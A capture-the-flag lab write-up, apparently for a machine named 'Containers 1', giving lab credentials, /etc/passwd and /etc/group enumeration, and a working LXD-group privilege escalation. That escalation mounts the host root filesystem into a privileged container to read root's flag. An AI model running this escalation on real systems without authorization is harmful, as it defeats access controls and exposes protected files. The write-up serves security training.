# Containers 1

Target : 10.10.1.14

Credentials : crawley | MXQtE$#7*1a

Tags : Privilege Escalation | Linux User Groups Exploit | LXD Group Exploit
***

## Flag 1: How many users are there on the target machine apart from the root user?

`cat /etc/passwd` displays the users at the end of the file. I also `ls /home` directory and look to see how many user folders there are.
***

## Flag 2: What is the username of the UID 1001 on the target machine?

You can find the answer with the previous command  `cat /etc/passwd`. 
***

## Flag 3: What is the name of the user from the LXD group on the target machine? 

`cat /etc/group | grep "lxd"` will provide with answer.
***

## Flag 4: What is the GID of the LXD group?

The previous command will provide the answer.
***

## Flag 5: What is the value in the file flag.txt at the target?

Found this [blog](https://reboare.github.io/lxd/lxd-escape.html) that greatly helped.

`lxd init`

`lxc init ubuntu:16.04 test -c security.privileged=true`

`lxc config device add test whatever disk source=/ path=/mnt/root recursive=true`

`lxc start test`

`lxc exec test bash`

`cd /mnt/root`

`cd root`

`ls`

`cat flag.txt`

